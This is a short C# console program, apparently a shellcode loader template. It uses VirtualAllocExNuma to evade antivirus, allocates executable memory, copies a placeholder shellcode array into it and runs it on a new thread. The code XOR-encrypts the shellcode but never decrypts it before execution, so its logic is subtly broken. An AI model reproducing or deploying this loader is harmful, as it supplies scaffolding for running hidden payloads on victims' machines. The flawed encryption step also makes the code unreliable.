using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Net;
using System.Text;
using System.Threading;
using System.Security.Policy;

namespace ConsoleApp1
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize,
            uint flAllocationType, uint flProtect, uint nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
            uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
                  uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle,
            UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        static void Main(string[] args)
        {
            // Original shellcode bytes
            byte[] originalShellcode = new byte[511] { /* Original shellcode bytes here */ };

            // Key for XOR encryption
            byte[] key = Encoding.ASCII.GetBytes("yourkey");

            // Encrypt the shellcode using XOR encryption
            byte[] encryptedShellcode = new byte[originalShellcode.Length];
            for (int i = 0; i < originalShellcode.Length; i++)
            {
                encryptedShellcode[i] = (byte)(originalShellcode[i] ^ key[i % key.Length]);
            }

            int size = encryptedShellcode.Length;

            IntPtr hProcess = GetCurrentProcess();
            IntPtr addr = VirtualAllocExNuma(hProcess, IntPtr.Zero, (IntPtr)0x1000, 0x3000, 0x40, 0);

            Marshal.Copy(encryptedShellcode, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr,
                IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
